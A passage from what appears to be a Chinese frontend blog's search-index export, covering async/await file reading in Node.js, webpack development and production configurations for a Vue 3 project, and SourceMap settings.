async与await结合编写测试代码的文件为test.js。假定任务：读取文件夹resource中的三个文件：1.html、2.html、3.html并拼接输出；resource文件夹和test.js同级。 如果使用回调函数的方式，在test.js文件中的代码如下： 12345678910111213const fs = require(&#x27;fs&#x27;)// 回调函数的方式fs.readFile(&quot;./resource/1.html&quot;, (err, data1) =&gt; &#123; if (err) throw err; fs.readFile(&#x27;./resource/2.html&#x27;, (err, data2) =&gt; &#123; if (err) throw err; fs.readFile(&#x27;./resource/3.html&#x27;, (err, data3) =&gt; &#123; if (err) throw err; console.log(data1 + data2 + data3) &#125;) &#125;)&#125;) 如果使用 async 与 await 的方式，在test.js文件中的代码如下： 1234567891011121314151617const fs = require(&#x27;fs&#x27;)const util = require(&#x27;util&#x27;)const mineReadFile = util.promisify(fs.readFile)// async与await的方式async function main() &#123; try &#123; // 读取文件内容 let data1 = await mineReadFile(&#x27;./resource/1.html&#x27;) let data2 = await mineReadFile(&#x27;./resource/2.html&#x27;) let data3 = await mineReadFile(&#x27;./resource/3.html&#x27;) console.log(data1 + data2 + data3) &#125; catch (e) &#123; console.log(e) &#125;&#125;main() 可以发现，如果使用promise，可以在then()、catch()方法中看到回调函数，但是在async与await的使用过程中是看不到回调函数的，非常简洁。就和我们写同步任务的写法差不多，只是多了个 await而已，实现的却是异步的。 async与await结合发送ajax请求","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"在vue中使用webpack","slug":"在vue中使用webpack","date":"2022-10-24T09:26:39.000Z","updated":"2022-10-24T09:26:39.000Z","comments":true,"path":"2022/10/24/在vue中使用webpack/","link":"","permalink":"https://avalooooooon.github.io/2022/10/24/%E5%9C%A8vue%E4%B8%AD%E4%BD%BF%E7%94%A8webpack/","excerpt":"给出webpack.dev.js文件和webpack.prod.js文件。","text":"给出webpack.dev.js文件和webpack.prod.js文件。 开发模式配置下面是webpack.dev.js文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151// webpack.dev.jsconst path = require(&quot;path&quot;);const ESLintWebpackPlugin = require(&quot;eslint-webpack-plugin&quot;);const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);const &#123; VueLoaderPlugin &#125; = require(&quot;vue-loader&quot;);const &#123; DefinePlugin &#125; = require(&quot;webpack&quot;);const CopyPlugin = require(&quot;copy-webpack-plugin&quot;);const getStyleLoaders = (preProcessor) =&gt; &#123; return [ &quot;vue-style-loader&quot;, &quot;css-loader&quot;, &#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [ &quot;postcss-preset-env&quot;, // 能解决多数样式兼容性问题 ], &#125;, &#125;, &#125;, preProcessor, ].filter(Boolean);&#125;;module.exports = &#123; entry: &quot;./src/main.js&quot;, output: &#123; path: undefined, filename: &quot;static/js/[name].js&quot;, chunkFilename: &quot;static/js/[name].chunk.js&quot;, assetModuleFilename: &quot;static/js/[hash:10][ext][query]&quot;, &#125;, module: &#123; rules: [ &#123; // 用来匹配 .css 结尾的文件 test: /\\.css$/, // use 数组里面 Loader 执行顺序是从右到左 use: getStyleLoaders(), &#125;, &#123; test: /\\.less$/, use: getStyleLoaders(&quot;less-loader&quot;), &#125;, &#123; test: /\\.s[ac]ss$/, use: getStyleLoaders(&quot;sass-loader&quot;), &#125;, &#123; test: /\\.styl$/, use: getStyleLoaders(&quot;stylus-loader&quot;), &#125;, &#123; test: /\\.(png|jpe?g|gif|svg)$/, type: &quot;asset&quot;, parser: &#123; dataUrlCondition: &#123; maxSize: 10 * 1024, // 小于10kb的图片会被base64处理 &#125;, &#125;, &#125;, &#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, &#125;, &#123; test: /\\.(jsx|js)$/, include: path.resolve(__dirname, &quot;../src&quot;), loader: &quot;babel-loader&quot;, options: &#123; cacheDirectory: true, cacheCompression: false, plugins: [ // &quot;@babel/plugin-transform-runtime&quot; // presets中包含了 ], &#125;, &#125;, // vue-loader不支持oneOf &#123; test: /\\.vue$/, loader: &quot;vue-loader&quot;, // 内部会给vue文件注入HMR功能代码 options: &#123; // 开启缓存 cacheDirectory: path.resolve( __dirname, &quot;node_modules/.cache/vue-loader&quot; ), &#125;, &#125;, ], &#125;, plugins: [ new ESLintWebpackPlugin(&#123; context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, cache: true, cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ), &#125;), new HtmlWebpackPlugin(&#123; template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), new CopyPlugin(&#123; patterns: [ &#123; from: path.resolve(__dirname, &quot;../public&quot;), to: path.resolve(__dirname, &quot;../dist&quot;), toType: &quot;dir&quot;, noErrorOnMissing: true, globOptions: &#123; ignore: [&quot;**/index.html&quot;], &#125;, info: &#123; minimized: true, &#125;, &#125;, ], &#125;), new VueLoaderPlugin(), // 解决页面警告 new DefinePlugin(&#123; __VUE_OPTIONS_API__: &quot;true&quot;, __VUE_PROD_DEVTOOLS__: &quot;false&quot;, &#125;), ], optimization: &#123; splitChunks: &#123; chunks: &quot;all&quot;, &#125;, runtimeChunk: &#123; name: (entrypoint) =&gt; `runtime~$&#123;entrypoint.name&#125;`, &#125;, &#125;, resolve: &#123; extensions: [&quot;.vue&quot;, &quot;.js&quot;, &quot;.json&quot;], // 自动补全文件扩展名，让vue可以使用 &#125;, devServer: &#123; open: true, host: &quot;localhost&quot;, port: 3000, hot: true, compress: true, historyApiFallback: true, // 解决vue-router刷新404问题 &#125;, mode: &quot;development&quot;, devtool: &quot;cheap-module-source-map&quot;,&#125;; 生产模式配置下面是webpack.prod.js文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182// webpack.prod.jsconst path = require(&quot;path&quot;);const ESLintWebpackPlugin = require(&quot;eslint-webpack-plugin&quot;);const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);const CssMinimizerPlugin = require(&quot;css-minimizer-webpack-plugin&quot;);const TerserWebpackPlugin = require(&quot;terser-webpack-plugin&quot;);const ImageMinimizerPlugin = require(&quot;image-minimizer-webpack-plugin&quot;);const &#123; VueLoaderPlugin &#125; = require(&quot;vue-loader&quot;);const &#123; DefinePlugin &#125; = require(&quot;webpack&quot;);const getStyleLoaders = (preProcessor) =&gt; &#123; return [ MiniCssExtractPlugin.loader, &quot;css-loader&quot;, &#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [ &quot;postcss-preset-env&quot;, // 能解决大多数样式兼容性问题 ], &#125;, &#125;, &#125;, preProcessor, ].filter(Boolean);&#125;;module.exports = &#123; entry: &quot;./src/main.js&quot;, output: &#123; path: undefined, filename: &quot;static/js/[name].[contenthash:10].js&quot;, chunkFilename: &quot;static/js/[name].[contenthash:10].chunk.js&quot;, assetModuleFilename: &quot;static/js/[hash:10][ext][query]&quot;, clean: true, &#125;, module: &#123; rules: [ &#123; // 用来匹配 .css 结尾的文件 test: /\\.css$/, // use 数组里面 Loader 执行顺序是从右到左 use: getStyleLoaders(), &#125;, &#123; test: /\\.less$/, use: getStyleLoaders(&quot;less-loader&quot;), &#125;, &#123; test: /\\.s[ac]ss$/, use: getStyleLoaders(&quot;sass-loader&quot;), &#125;, &#123; test: /\\.styl$/, use: getStyleLoaders(&quot;stylus-loader&quot;), &#125;, &#123; test: /\\.(png|jpe?g|gif|svg)$/, type: &quot;asset&quot;, parser: &#123; dataUrlCondition: &#123; maxSize: 10 * 1024, // 小于10kb的图片会被base64处理 &#125;, &#125;, &#125;, &#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, &#125;, &#123; test: /\\.(jsx|js)$/, include: path.resolve(__dirname, &quot;../src&quot;), loader: &quot;babel-loader&quot;, options: &#123; cacheDirectory: true, cacheCompression: false, plugins: [ // &quot;@babel/plugin-transform-runtime&quot; // presets中包含了 ], &#125;, &#125;, // vue-loader不支持oneOf &#123; test: /\\.vue$/, loader: &quot;vue-loader&quot;, // 内部会给vue文件注入HMR功能代码 options: &#123; // 开启缓存 cacheDirectory: path.resolve( __dirname, &quot;node_modules/.cache/vue-loader&quot; ), &#125;, &#125;, ], &#125;, plugins: [ new ESLintWebpackPlugin(&#123; context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, cache: true, cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ), &#125;), new HtmlWebpackPlugin(&#123; template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), new CopyPlugin(&#123; patterns: [ &#123; from: path.resolve(__dirname, &quot;../public&quot;), to: path.resolve(__dirname, &quot;../dist&quot;), toType: &quot;dir&quot;, noErrorOnMissing: true, globOptions: &#123; ignore: [&quot;**/index.html&quot;], &#125;, info: &#123; minimized: true, &#125;, &#125;, ], &#125;), new MiniCssExtractPlugin(&#123; filename: &quot;static/css/[name].[contenthash:10].css&quot;, chunkFilename: &quot;static/css/[name].[contenthash:10].chunk.css&quot;, &#125;), new VueLoaderPlugin(), new DefinePlugin(&#123; __VUE_OPTIONS_API__: &quot;true&quot;, __VUE_PROD_DEVTOOLS__: &quot;false&quot;, &#125;), ], optimization: &#123; // 压缩的操作 minimizer: [ new CssMinimizerPlugin(), new TerserWebpackPlugin(), new ImageMinimizerPlugin(&#123; minimizer: &#123; implementation: ImageMinimizerPlugin.imageminGenerate, options: &#123; plugins: [ [&quot;gifsicle&quot;, &#123; interlaced: true &#125;], [&quot;jpegtran&quot;, &#123; progressive: true &#125;], [&quot;optipng&quot;, &#123; optimizationLevel: 5 &#125;], [ &quot;svgo&quot;, &#123; plugins: [ &quot;preset-default&quot;, &quot;prefixIds&quot;, &#123; name: &quot;sortAttrs&quot;, params: &#123; xmlnsOrder: &quot;alphabetical&quot;, &#125;, &#125;, ], &#125;, ], ], &#125;, &#125;, &#125;), ], splitChunks: &#123; chunks: &quot;all&quot;, &#125;, runtimeChunk: &#123; name: (entrypoint) =&gt; `runtime~$&#123;entrypoint.name&#125;`, &#125;, &#125;, resolve: &#123; extensions: [&quot;.vue&quot;, &quot;.js&quot;, &quot;.json&quot;], &#125;, mode: &quot;production&quot;, devtool: &quot;source-map&quot;,&#125;; 其他配置下面是package.json文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#123; &quot;name&quot;: &quot;vue-cli&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;main.js&quot;, &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;npm run dev&quot;, &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack serve --config ./config/webpack.dev.js&quot;, &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config ./config/webpack.prod.js&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;@babel/core&quot;: &quot;^7.17.10&quot;, &quot;@babel/eslint-parser&quot;: &quot;^7.17.0&quot;, &quot;@vue/cli-plugin-babel&quot;: &quot;^5.0.4&quot;, &quot;babel-loader&quot;: &quot;^8.2.5&quot;, &quot;copy-webpack-plugin&quot;: &quot;^10.2.4&quot;, &quot;cross-env&quot;: &quot;^7.0.3&quot;, &quot;css-loader&quot;: &quot;^6.7.1&quot;, &quot;css-minimizer-webpack-plugin&quot;: &quot;^3.4.1&quot;, &quot;eslint-plugin-vue&quot;: &quot;^8.7.1&quot;, &quot;eslint-webpack-plugin&quot;: &quot;^3.1.1&quot;, &quot;html-webpack-plugin&quot;: &quot;^5.5.0&quot;, &quot;image-minimizer-webpack-plugin&quot;: &quot;^3.2.3&quot;, &quot;imagemin&quot;: &quot;^8.0.1&quot;, &quot;imagemin-gifsicle&quot;: &quot;^7.0.0&quot;, &quot;imagemin-jpegtran&quot;: &quot;^7.0.0&quot;, &quot;imagemin-optipng&quot;: &quot;^8.0.0&quot;, &quot;imagemin-svgo&quot;: &quot;^10.0.1&quot;, &quot;less-loader&quot;: &quot;^10.2.0&quot;, &quot;mini-css-extract-plugin&quot;: &quot;^2.6.0&quot;, &quot;postcss-preset-env&quot;: &quot;^7.5.0&quot;, &quot;sass-loader&quot;: &quot;^12.6.0&quot;, &quot;stylus-loader&quot;: &quot;^6.2.0&quot;, &quot;vue-loader&quot;: &quot;^17.0.0&quot;, &quot;vue-style-loader&quot;: &quot;^4.1.3&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.14&quot;, &quot;webpack&quot;: &quot;^5.72.0&quot;, &quot;webpack-cli&quot;: &quot;^4.9.2&quot;, &quot;webpack-dev-server&quot;: &quot;^4.9.0&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;vue&quot;: &quot;^3.2.33&quot;, &quot;vue-router&quot;: &quot;^4.0.15&quot; &#125;, &quot;browserslist&quot;: [&quot;last 2 version&quot;, &quot;&gt; 1%&quot;, &quot;not dead&quot;]&#125; 下面是.eslintrc.js: 12345678910module.exports = &#123; root: true, env: &#123; node: true, &#125;, extends: [&quot;plugin:vue/vue3-essential&quot;, &quot;eslint:recommended&quot;], parserOptions: &#123; parser: &quot;@babel/eslint-parser&quot;, &#125;,&#125;; 下面是babel.config.js: 123module.exports = &#123; presets: [&quot;@vue/cli-plugin-babel/preset&quot;],&#125;; 合并开发和生产配置下面是webpack.config.js: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198// webpack.config.jsconst path = require(&quot;path&quot;);const ESLintWebpackPlugin = require(&quot;eslint-webpack-plugin&quot;);const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);const CssMinimizerPlugin = require(&quot;css-minimizer-webpack-plugin&quot;);const TerserWebpackPlugin = require(&quot;terser-webpack-plugin&quot;);const ImageMinimizerPlugin = require(&quot;image-minimizer-webpack-plugin&quot;);const &#123; VueLoaderPlugin &#125; = require(&quot;vue-loader&quot;);const &#123; DefinePlugin &#125; = require(&quot;webpack&quot;);const CopyPlugin = require(&quot;copy-webpack-plugin&quot;);// 需要通过 cross-env 定义环境变量const isProduction = process.env.NODE_ENV === &quot;production&quot;;const getStyleLoaders = (preProcessor) =&gt; &#123; return [ isProduction ? MiniCssExtractPlugin.loader : &quot;vue-style-loader&quot;, &quot;css-loader&quot;, &#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [&quot;postcss-preset-env&quot;], &#125;, &#125;, &#125;, preProcessor, ].filter(Boolean);&#125;;module.exports = &#123; entry: &quot;./src/main.js&quot;, output: &#123; path: isProduction ? path.resolve(__dirname, &quot;../dist&quot;) : undefined, filename: isProduction ? &quot;static/js/[name].[contenthash:10].js&quot; : &quot;static/js/[name].js&quot;, chunkFilename: isProduction ? &quot;static/js/[name].[contenthash:10].chunk.js&quot; : &quot;static/js/[name].chunk.js&quot;, assetModuleFilename: &quot;static/js/[hash:10][ext][query]&quot;, clean: true, &#125;, module: &#123; rules: [ &#123; // 用来匹配 .css 结尾的文件 test: /\\.css$/, // use 数组里面 Loader 执行顺序是从右到左 use: getStyleLoaders(), &#125;, &#123; test: /\\.less$/, use: getStyleLoaders(&quot;less-loader&quot;), &#125;, &#123; test: /\\.s[ac]ss$/, use: getStyleLoaders(&quot;sass-loader&quot;), &#125;, &#123; test: /\\.styl$/, use: getStyleLoaders(&quot;stylus-loader&quot;), &#125;, &#123; test: /\\.(png|jpe?g|gif|svg)$/, type: &quot;asset&quot;, parser: &#123; dataUrlCondition: &#123; maxSize: 10 * 1024, // 小于10kb的图片会被base64处理 &#125;, &#125;, &#125;, &#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, &#125;, &#123; test: /\\.(jsx|js)$/, include: path.resolve(__dirname, &quot;../src&quot;), loader: &quot;babel-loader&quot;, options: &#123; cacheDirectory: true, cacheCompression: false, plugins: [ // &quot;@babel/plugin-transform-runtime&quot; // presets中包含了 ], &#125;, &#125;, // vue-loader不支持oneOf &#123; test: /\\.vue$/, loader: &quot;vue-loader&quot;, // 内部会给vue文件注入HMR功能代码 options: &#123; // 开启缓存 cacheDirectory: path.resolve( __dirname, &quot;node_modules/.cache/vue-loader&quot; ), &#125;, &#125;, ], &#125;, plugins: [ new ESLintWebpackPlugin(&#123; context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, cache: true, cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ), &#125;), new HtmlWebpackPlugin(&#123; template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), new CopyPlugin(&#123; patterns: [ &#123; from: path.resolve(__dirname, &quot;../public&quot;), to: path.resolve(__dirname, &quot;../dist&quot;), toType: &quot;dir&quot;, noErrorOnMissing: true, globOptions: &#123; ignore: [&quot;**/index.html&quot;], &#125;, info: &#123; minimized: true, &#125;, &#125;, ], &#125;), isProduction &amp;&amp; new MiniCssExtractPlugin(&#123; filename: &quot;static/css/[name].[contenthash:10].css&quot;, chunkFilename: &quot;static/css/[name].[contenthash:10].chunk.css&quot;, &#125;), new VueLoaderPlugin(), new DefinePlugin(&#123; __VUE_OPTIONS_API__: &quot;true&quot;, __VUE_PROD_DEVTOOLS__: &quot;false&quot;, &#125;), ].filter(Boolean), optimization: &#123; minimize: isProduction, // 压缩的操作 minimizer: [ new CssMinimizerPlugin(), new TerserWebpackPlugin(), new ImageMinimizerPlugin(&#123; minimizer: &#123; implementation: ImageMinimizerPlugin.imageminGenerate, options: &#123; plugins: [ [&quot;gifsicle&quot;, &#123; interlaced: true &#125;], [&quot;jpegtran&quot;, &#123; progressive: true &#125;], [&quot;optipng&quot;, &#123; optimizationLevel: 5 &#125;], [ &quot;svgo&quot;, &#123; plugins: [ &quot;preset-default&quot;, &quot;prefixIds&quot;, &#123; name: &quot;sortAttrs&quot;, params: &#123; xmlnsOrder: &quot;alphabetical&quot;, &#125;, &#125;, ], &#125;, ], ], &#125;, &#125;, &#125;), ], splitChunks: &#123; chunks: &quot;all&quot;, &#125;, runtimeChunk: &#123; name: (entrypoint) =&gt; `runtime~$&#123;entrypoint.name&#125;`, &#125;, &#125;, resolve: &#123; extensions: [&quot;.vue&quot;, &quot;.js&quot;, &quot;.json&quot;], &#125;, devServer: &#123; open: true, host: &quot;localhost&quot;, port: 3000, hot: true, compress: true, historyApiFallback: true, // 解决vue-router刷新404问题 &#125;, mode: isProduction ? &quot;production&quot; : &quot;development&quot;, devtool: isProduction ? &quot;source-map&quot; : &quot;cheap-module-source-map&quot;,&#125;; 优化配置下面是webpack.config.js: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253const path = require(&quot;path&quot;);const ESLintWebpackPlugin = require(&quot;eslint-webpack-plugin&quot;);const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);const CssMinimizerPlugin = require(&quot;css-minimizer-webpack-plugin&quot;);const ImageMinimizerPlugin = require(&quot;image-minimizer-webpack-plugin&quot;);const TerserWebpackPlugin = require(&quot;terser-webpack-plugin&quot;);const CopyPlugin = require(&quot;copy-webpack-plugin&quot;);const &#123; VueLoaderPlugin &#125; = require(&quot;vue-loader&quot;);const &#123; DefinePlugin &#125; = require(&quot;webpack&quot;);const AutoImport = require(&quot;unplugin-auto-import/webpack&quot;);const Components = require(&quot;unplugin-vue-components/webpack&quot;);const &#123; ElementPlusResolver &#125; = require(&quot;unplugin-vue-components/resolvers&quot;);// 需要通过 cross-env 定义环境变量const isProduction = process.env.NODE_ENV === &quot;production&quot;;const getStyleLoaders = (preProcessor) =&gt; &#123; return [ isProduction ? MiniCssExtractPlugin.loader : &quot;vue-style-loader&quot;, &quot;css-loader&quot;, &#123; loader: &quot;postcss-loader&quot;, options: &#123; postcssOptions: &#123; plugins: [&quot;postcss-preset-env&quot;], &#125;, &#125;, &#125;, preProcessor &amp;&amp; &#123; loader: preProcessor, options: preProcessor === &quot;sass-loader&quot; ? &#123; // 自定义主题：自动引入我们定义的scss文件 additionalData: `@use &quot;@/styles/element/index.scss&quot; as *;`, &#125; : &#123;&#125;, &#125;, ].filter(Boolean);&#125;;module.exports = &#123; entry: &quot;./src/main.js&quot;, output: &#123; path: isProduction ? path.resolve(__dirname, &quot;../dist&quot;) : undefined, filename: isProduction ? &quot;static/js/[name].[contenthash:10].js&quot; : &quot;static/js/[name].js&quot;, chunkFilename: isProduction ? &quot;static/js/[name].[contenthash:10].chunk.js&quot; : &quot;static/js/[name].chunk.js&quot;, assetModuleFilename: &quot;static/js/[hash:10][ext][query]&quot;, clean: true, &#125;, module: &#123; rules: [ &#123; test: /\\.css$/, use: getStyleLoaders(), &#125;, &#123; test: /\\.less$/, use: getStyleLoaders(&quot;less-loader&quot;), &#125;, &#123; test: /\\.s[ac]ss$/, use: getStyleLoaders(&quot;sass-loader&quot;), &#125;, &#123; test: /\\.styl$/, use: getStyleLoaders(&quot;stylus-loader&quot;), &#125;, &#123; test: /\\.(png|jpe?g|gif|svg)$/, type: &quot;asset&quot;, parser: &#123; dataUrlCondition: &#123; maxSize: 10 * 1024, &#125;, &#125;, &#125;, &#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, &#125;, &#123; test: /\\.(jsx|js)$/, include: path.resolve(__dirname, &quot;../src&quot;), loader: &quot;babel-loader&quot;, options: &#123; cacheDirectory: true, cacheCompression: false, plugins: [ // &quot;@babel/plugin-transform-runtime&quot; // presets中包含了 ], &#125;, &#125;, // vue-loader不支持oneOf &#123; test: /\\.vue$/, loader: &quot;vue-loader&quot;, // 内部会给vue文件注入HMR功能代码 options: &#123; // 开启缓存 cacheDirectory: path.resolve( __dirname, &quot;node_modules/.cache/vue-loader&quot; ), &#125;, &#125;, ], &#125;, plugins: [ new ESLintWebpackPlugin(&#123; context: path.resolve(__dirname, &quot;../src&quot;), exclude: &quot;node_modules&quot;, cache: true, cacheLocation: path.resolve( __dirname, &quot;../node_modules/.cache/.eslintcache&quot; ), &#125;), new HtmlWebpackPlugin(&#123; template: path.resolve(__dirname, &quot;../public/index.html&quot;), &#125;), new CopyPlugin(&#123; patterns: [ &#123; from: path.resolve(__dirname, &quot;../public&quot;), to: path.resolve(__dirname, &quot;../dist&quot;), toType: &quot;dir&quot;, noErrorOnMissing: true, globOptions: &#123; ignore: [&quot;**/index.html&quot;], &#125;, info: &#123; minimized: true, &#125;, &#125;, ], &#125;), isProduction &amp;&amp; new MiniCssExtractPlugin(&#123; filename: &quot;static/css/[name].[contenthash:10].css&quot;, chunkFilename: &quot;static/css/[name].[contenthash:10].chunk.css&quot;, &#125;), new VueLoaderPlugin(), new DefinePlugin(&#123; __VUE_OPTIONS_API__: &quot;true&quot;, __VUE_PROD_DEVTOOLS__: &quot;false&quot;, &#125;), // 按需加载element-plus组件样式 AutoImport(&#123; resolvers: [ElementPlusResolver()], &#125;), Components(&#123; resolvers: [ ElementPlusResolver(&#123; importStyle: &quot;sass&quot;, // 自定义主题 &#125;), ], &#125;), ].filter(Boolean), optimization: &#123; minimize: isProduction, // 压缩的操作 minimizer: [ new CssMinimizerPlugin(), new TerserWebpackPlugin(), new ImageMinimizerPlugin(&#123; minimizer: &#123; implementation: ImageMinimizerPlugin.imageminGenerate, options: &#123; plugins: [ [&quot;gifsicle&quot;, &#123; interlaced: true &#125;], [&quot;jpegtran&quot;, &#123; progressive: true &#125;], [&quot;optipng&quot;, &#123; optimizationLevel: 5 &#125;], [ &quot;svgo&quot;, &#123; plugins: [ &quot;preset-default&quot;, &quot;prefixIds&quot;, &#123; name: &quot;sortAttrs&quot;, params: &#123; xmlnsOrder: &quot;alphabetical&quot;, &#125;, &#125;, ], &#125;, ], ], &#125;, &#125;, &#125;), ], splitChunks: &#123; chunks: &quot;all&quot;, cacheGroups: &#123; // layouts通常是admin项目的主体布局组件，所有路由组件都要使用的 // 可以单独打包，从而复用 // 如果项目中没有，请删除 layouts: &#123; name: &quot;layouts&quot;, test: path.resolve(__dirname, &quot;../src/layouts&quot;), priority: 40, &#125;, // 如果项目中使用element-plus，此时将所有node_modules打包在一起，那么打包输出文件会比较大。 // 所以我们将node_modules中比较大的模块单独打包，从而并行加载速度更好 // 如果项目中没有，请删除 elementUI: &#123; name: &quot;chunk-elementPlus&quot;, test: /[\\\\/]node_modules[\\\\/]_?element-plus(.*)/, priority: 30, &#125;, // 将vue相关的库单独打包，减少node_modules的chunk体积。 vue: &#123; name: &quot;vue&quot;, test: /[\\\\/]node_modules[\\\\/]vue(.*)[\\\\/]/, chunks: &quot;initial&quot;, priority: 20, &#125;, libs: &#123; name: &quot;chunk-libs&quot;, test: /[\\\\/]node_modules[\\\\/]/, priority: 10, // 权重最低，优先考虑前面内容 chunks: &quot;initial&quot;, &#125;, &#125;, &#125;, runtimeChunk: &#123; name: (entrypoint) =&gt; `runtime~$&#123;entrypoint.name&#125;`, &#125;, &#125;, resolve: &#123; extensions: [&quot;.vue&quot;, &quot;.js&quot;, &quot;.json&quot;], alias: &#123; // 路径别名 &quot;@&quot;: path.resolve(__dirname, &quot;../src&quot;), &#125;, &#125;, devServer: &#123; open: true, host: &quot;localhost&quot;, port: 3000, hot: true, compress: true, historyApiFallback: true, // 解决vue-router刷新404问题 &#125;, mode: isProduction ? &quot;production&quot; : &quot;development&quot;, devtool: isProduction ? &quot;source-map&quot; : &quot;cheap-module-source-map&quot;, performance: false,&#125;;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://avalooooooon.github.io/tags/Vue/"},{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"}]},{"title":"webpack优化","slug":"webpack优化","date":"2022-10-20T09:01:48.000Z","updated":"2022-10-20T09:01:48.000Z","comments":true,"path":"2022/10/20/webpack优化/","link":"","permalink":"https://avalooooooon.github.io/2022/10/20/webpack%E4%BC%98%E5%8C%96/","excerpt":"","text":"提升开发体验——SourceMapSourceMap（源代码映射）是一个用来生成源代码与构建后代码一一映射的文件的方案。它会生成一个 xxx.map 文件，里面包含源代码和构建后代码每一行、每一列的映射关系。当构建后代码出错了，会通过 xxx.map 文件，从构建后代码出错位置找到映射后源代码出错位置，从而让浏览器提示源代码文件出错位置，帮助我们更快的找到错误根源。 开发时我们运行的代码是经过 webpack 编译后的，可以在npm start后打开浏览器的检查-&gt;源代码-&gt;static中找到main.js，可以看到所有 css 和 js 合并成了一个文件，并且多了其他代码，有很多注释，且每个模块都通过eval()函数包裹起来了，如下图。此时如果代码运行出错，提示的代码错误位置是编译后代码的位置，根本看不懂。一旦将来开发代码文件很多，那么很难去发现错误出现在哪里。所以我们需要更加准确的错误提示，来帮助我们更好的开发代码。通过sourcemap生成的文件是可以反编译获取到源码的，生产环境下一般关闭sourcemap。 不搞SourceMap的话main.js大概长下面这个样子： 123456789101112131415/* * ATTENTION: The... ). ... * If y...n&quot; (https://webpack.js.org/configuration/mode/). *//******/ (() =&gt; &#123; // webpackBootstrap/******/ &quot;use strict&quot;;/******/ var __webpack_modules__ = (&#123;/***/ &quot;./node_modules/css-loader/dist/cjs.js!./node_modules/less-loader/dist/cjs.js!./src/less/index.less&quot;:/*!****************************************************************//***/ ((module, __webpack_exports__, __webpack_require__) =&gt; &#123;eval(&quot;__webpack_require_......&quot;);/***/ &#125;), 查看Webpack DevTool文档，它介绍了SourceMap的生成方式。配置方式叫devtool，开发者调试工具。SourceMap 的值有很多种情况：eval会把SourceMap文件打包到源代码的位置，用一个eval()函数包裹住；eval-cheap-xxx就只会构建每一行的映射关系，而不构建列的对应关系。。。performance下分别是初次构建和重新构建的速度；production是能否用于生产环境。实际开发时我们只需要关注两种情况即可，在开发模式和生产模式对应的配置文件添加下面的配置，形如devtool: &quot;cheap-module-source-map&quot;。： 开发模式：使用cheap-module-source-map 优点：打包编译速度快，只包含行映射 缺点：没有列映射12345module.exports = &#123; // 其他省略 mode: &quot;development&quot;, devtool: &quot;cheap-module-source-map&quot;,&#125;; 生产模式：使用source-map 优点：又有行映射，又有列映射。 缺点：打包编译速度更慢1234module.exports = 